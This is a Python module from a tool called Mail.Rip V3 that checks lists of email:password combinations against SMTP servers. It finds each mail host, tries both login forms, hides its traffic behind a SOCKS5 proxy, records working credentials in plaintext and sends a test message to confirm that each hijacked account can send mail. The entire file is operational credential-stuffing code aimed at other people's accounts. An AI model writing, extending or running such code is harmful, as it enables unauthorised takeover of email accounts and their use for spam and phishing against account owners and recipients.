#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-

__author__ = 'DrPython3'
__date__ = '2021-12-06'
__version__ = 'BETA(1.2)'
__contact__ = 'https://github.com/DrPython3'

'''
---------------------------------------------
Functions for Checking Mailpass Combos (SMTP)
---------------------------------------------

Part of << Mail.Rip V3: https://github.com/DrPython3/MailRipV3 >>
'''

# [IMPORTS]
# ---------

import sys
import ssl
import smtplib
import json
from inc_testmail import mailer
from inc_etc import result
from inc_mxlookup import get_host

# [VARIABLES AND OTHER STUFF]
# ---------------------------

try:
    # load SMTP lists and dictionary from JSON files:
    with open('inc_smtpports.json') as inc_smtpports:
        load_smtpports = json.load(inc_smtpports)
        smtp_ports = (load_smtpports['smtpports'])
    with open('inc_smtpservices.json') as inc_smtpservices:
        load_smtpservices = json.load(inc_smtpservices)
        smtp_services = (load_smtpservices['smtpservices'])
except:
    # on errors, set empty lists and dictionary:
    smtp_ports = []
    smtp_services = {}

# [FUNCTIONS]
# -----------

def smtpchecker(default_timeout, default_email, target, use_proxy=True, proxy_host='', proxy_port=0, proxy_username='', proxy_password=''):
    '''
    Main checker function (SMTP) including testmail sending in case a valid login is found.
    Added support for Bright Data proxy.

    :param float default_timeout: connection timeout set by user
    :param str default_email: user email for sending testmail
    :param str target: emailpass combo to check
    :param bool use_proxy: flag to enable/disable proxy
    :param str proxy_host: Bright Data proxy host
    :param int proxy_port: Bright Data proxy port
    :param str proxy_username: Bright Data proxy username
    :param str proxy_password: Bright Data proxy password
    :return: True (valid login), False (login not valid)
    '''
    # Import required modules
    import ssl
    import smtplib
    import socks
    import socket

    # Set up proxy if enabled
    original_socket = None
    if use_proxy and proxy_host and proxy_port:
        # Store the original socket implementation
        original_socket = socket.socket
        
        # Configure SOCKS proxy
        socks.set_default_proxy(
            proxy_type=socks.PROXY_TYPES['SOCKS5'],
            addr=proxy_host,
            port=proxy_port,
            username=proxy_username,
            password=proxy_password
        )
        
        # Patch the socket module to use SOCKS
        socket.socket = socks.socksocket

    # start the checking:
    try:
        # variables and stuff:
        sslcontext = ssl.create_default_context()
        output_hits = str('smtp_valid')
        output_checked = str('smtp_checked')
        output_testmail = str('smtp_testmessages')
        target_email = str('')
        target_user = str('')
        target_password = str('')
        target_host = str('')
        target_port = int(0)
        service_info = str('')
        service_found = False
        connection_ok = False
        checker_result = False
        email_sent = False
        # included lists and dictionary for SMTP checker:
        global smtp_domains
        global smtp_ports
        global smtp_services
        # prepare target information:
        new_target = str(str(target).replace('\n', ''))
        target_email, target_password = new_target.split(':')
        target_user = str(target_email)
        # try to get host and port from dictionary:
        try:
            service_info = str(smtp_services[str(target_email.split('@')[1])])
            target_host = str(service_info.split(':')[0])
            target_port = int(service_info.split(':')[1])
            # declare service details found:
            service_found = True
        except:
            pass
        # establish connection with any found service details:
        if service_found == True:
            try:
                # SSL-connection:
                if int(target_port) == int(465):
                    smtp_connection = smtplib.SMTP_SSL(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout,
                        context=sslcontext
                    )
                    smtp_connection.ehlo()
                    # declare connection established:
                    connection_ok = True
                # regular connection:
                else:
                    smtp_connection = smtplib.SMTP(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout
                    )
                    smtp_connection.ehlo()
                    # TLS:
                    try:
                        smtp_connection.starttls(
                            context=sslcontext
                        )
                        smtp_connection.ehlo()
                    except:
                        pass
                    # declare connection established:
                    connection_ok = True
            except:
                pass
        # if connection failed or no service details found, try to find host:
        if service_found == False or connection_ok == False:
            try:
                # try to get from MX records:
                mx_result, found_host = get_host(default_timeout, target_email)
            except:
                mx_result = False
                found_host = str('')
            # if host found using MX records:
            if mx_result == True:
                target_host = str(found_host)
                # get port:
                for next_port in smtp_ports:
                    # SSL-connection:
                    try:
                        if int(next_port) == int(465):
                            smtp_connection = smtplib.SMTP_SSL(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout,
                                context=sslcontext
                            )
                            smtp_connection.ehlo()
                            # change variables for established connections:
                            target_port = int(next_port)
                            connection_ok = True
                        else:
                            # regular connection:
                            smtp_connection = smtplib.SMTP(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout
                            )
                            smtp_connection.ehlo()
                            # TLS:
                            try:
                                smtp_connection.starttls(
                                    context=sslcontext
                                )
                                smtp_connection.ehlo()
                            except:
                                pass
                            # change variables for established connections:
                            target_port = int(next_port)
                            connection_ok = True
                        break
                    except:
                        continue
        # with connection established, check login details:
        if connection_ok == True:
            try:
                try:
                    # user = email:
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    # declare login valid:
                    checker_result = True
                except:
                    # user = userid from email:
                    target_user = str(target_email.split('@')[0])
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    # declare login valid:
                    checker_result = True
                try:
                    smtp_connection.quit()
                except:
                    pass
                # write logs:
                result_output = str(f'email={str(target_email)}, host={str(target_host)}:{str(target_port)}, login={str(target_user)}:{str(target_password)}')
                result(output_hits, result_output)
                result(output_checked, str(f'{new_target};result=login valid'))
                # show found login on screen:
                print(f'[VALID]    {result_output}')
            except:
                result(output_checked, str(f'{new_target};result=login failed'))
        # no connection established, write log:
        else:
            result(output_checked, str(f'{new_target};result=no connection'))
        # with valid login, try to send testmail:
        if checker_result == True:
            try:
                email_sent = mailer(
                    str(default_email),
                    str(target_email),
                    str(target_host),
                    int(target_port),
                    str(target_user),
                    str(target_password)
                )
                # write log for testmail:
                if email_sent == True:
                    result(output_testmail, str(f'{new_target};result=testmessage sent'))
                else:
                    result(output_testmail, str(f'{new_target};result=testmessage not sent'))
            # if testmail fails, write log:
            except:
                result(output_testmail, str(f'{new_target};result=testmessage failed'))
            return True
        else:
            return False
    # on any errors while checking, write log before exit:
    except Exception as e:
        result(output_checked, str(f'{new_target};result=check failed;error={str(e)}'))
        return False
    finally:
        # Restore original socket if proxy was used
        if use_proxy and original_socket:
            socket.socket = original_socket
            
# DrPython3 (C) 2021 @ GitHub.com
